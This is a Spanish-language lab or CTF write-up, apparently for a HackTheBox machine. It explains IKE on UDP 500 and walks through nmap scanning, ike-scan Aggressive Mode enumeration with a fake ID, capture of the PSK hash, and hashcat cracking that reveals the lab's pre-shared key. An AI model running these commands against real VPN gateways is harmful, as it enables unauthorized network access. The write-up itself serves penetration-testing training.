## UDP Abierto / IKE PSK Cracking – Explicación Completa e Integrada

### Contexto: UDP 500 y servicios IKE

El puerto **UDP 500** normalmente está abierto en dispositivos que ofrecen servicios **VPN IPsec**, como gateways corporativos (Cisco, Juniper, Fortinet, Palo Alto…), routers/firewalls con soporte IPsec, servidores de acceso remoto y algunos dispositivos IoT que usan IPsec.

Su función principal es permitir establecer **túneles seguros**, negociar algoritmos de cifrado y autenticar usuarios. UDP es un protocolo sin conexión, por lo que un puerto abierto indica que el host podría responder a paquetes específicos, pero muchas veces devuelve `open|filtered` si hay firewall o no responde a paquetes no esperados.

---

### Paso 1: Escaneo de puertos UDP

Primero identificamos los puertos abiertos usando Nmap:

```
nmap --open -sU --top-ports 100 -vvv -n -Pn -oN nmap_udp 10.129.67.1
```

Salida relevante:

```
500/udp  open          isakmp
4500/udp open|filtered nat-t-ike
68/udp   open|filtered dhcpc
69/udp   open|filtered tftp
```

* `500/udp open`: puerto IKE activo
* `4500/udp open|filtered`: NAT-T, puede estar filtrado
* `open|filtered`: no hay respuesta clara, normal en UDP

---

### Paso 2: Qué es IKE y modos de operación

**IKE (Internet Key Exchange)** es el protocolo que permite negociar **Security Associations (SA)** para IPsec:

* Intercambio seguro de claves usando Diffie-Hellman
* Negociación de algoritmos de cifrado y hash
* Autenticación de cliente y servidor
* Establecimiento de túneles VPN seguros

IKE puede operar en dos modos:

1. **Main Mode**: seguro, protege la identidad del cliente y realiza 6 pasos de handshake. No revela hashes ni IDs de usuarios.
2. **Aggressive Mode**: más rápido (3 pasos), revela información de servidor y cliente, incluyendo ID de usuario (correo o FQDN), Vendor ID y hash PSK. Es útil para pentesting porque permite **capturar el hash de la PSK y la identidad del usuario**.

Tipos de autenticación en IKE:

* **PSK (Pre-Shared Key)**: clave compartida, vulnerable si es débil
* **Certificados digitales (X.509)**: más seguro
* **XAUTH (Extended Authentication)**: usuario/contraseña adicional

---

### Paso 3: Escaneo IKE Main Mode

Para conocer los parámetros del servidor:

```
ike-scan 10.129.67.1
```

Ejemplo de output:

```
10.129.67.1 Main Mode Handshake returned
HDR=(CKY-R=a00cd0ce54d21ad0)
SA=(Enc=3DES Hash=SHA1 Group=2:modp1024 Auth=PSK LifeType=Seconds LifeDuration=28800)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
```

* `HDR (CKY-R)`: cookie del servidor para proteger contra ataques de repetición
* `SA`: parámetros de cifrado negociados (algoritmo, hash, grupo DH, autenticación, duración)
* `VID`: Vendor ID, indica software y capacidades del servidor

**Main Mode** no revela usuarios ni hashes, por eso necesitamos Aggressive Mode para pentesting.

---

### Paso 4: Escaneo IKE Aggressive Mode con fakeID

Se ejecuta:

```
sudo ike-scan -P -M -A -n fakeID 10.129.51.157
```

* `-n fakeID` envía un **ID falso** como cliente.
* El objetivo es **provocar la respuesta del servidor** sin necesidad de conocer usuarios legítimos.
* Aggressive Mode devuelve información que Main Mode no muestra: identidad del cliente y hash PSK.

Ejemplo de output:

```
10.129.51.157 Aggressive Mode Handshake returned
ID(Type=ID_USER_FQDN, Value=ike@expressway.htb)
VID=09002689dfd6b712 (XAUTH)
VID=afcad71368a1f1c96b8696fc77570100 (Dead Peer Detection v1.0)
Hash(20 bytes)
```

**Interpretación:**

* `ID`: el correo `ike@expressway.htb` es la identidad real del usuario, útil para ataques posteriores.
* `VID`: indica capacidades del servidor (XAUTH, DPD, etc.)
* `Hash(20 bytes)`: hash del PSK que podemos atacar

**Resumen:** usamos un `fakeID` para que el servidor devuelva información sensible incluso sin conocer un usuario real. El correo que devuelve nos permite **capturar un handshake válido** y usarlo en el crackeo de PSK.

---

### Paso 5: Captura de hash PSK usando el correo real

Con el correo obtenido del Aggressive Mode, podemos capturar el handshake correcto:

```
sudo ike-scan -M -A -n 'ike@expressway.htb' --pskcrack=hash.txt 10.129.51.157
```

* Guarda la información necesaria en `hash.txt` para crackeo.
* Esto garantiza que el hash corresponda a un usuario real y al PSK.

---

### Paso 6: Crackeo del PSK

Usamos `hashcat` con un diccionario:

```
hashcat hash.txt /usr/share/SecLists/Passwords/Leaked-Databases/rockyou.txt
```

Resultado:

```
Password --> freakingrockstarontheroad
```

Ahora tenemos la **Pre-Shared Key** que podría permitir autenticación en la VPN .

---

### Paso 7: Notas y contexto final

* Aggressive Mode revela información sensible, útil para **enumeración de usuarios** y **captura de hash PSK**.
* El ID/correo obtenido permite ataques de fuerza bruta dirigidos o validación de PSK.
* `fakeID` es solo un truco para provocar respuesta del servidor sin usuario real.
* Servidores modernos suelen deshabilitar Aggressive Mode y exigir certificados, lo que protege la PSK.
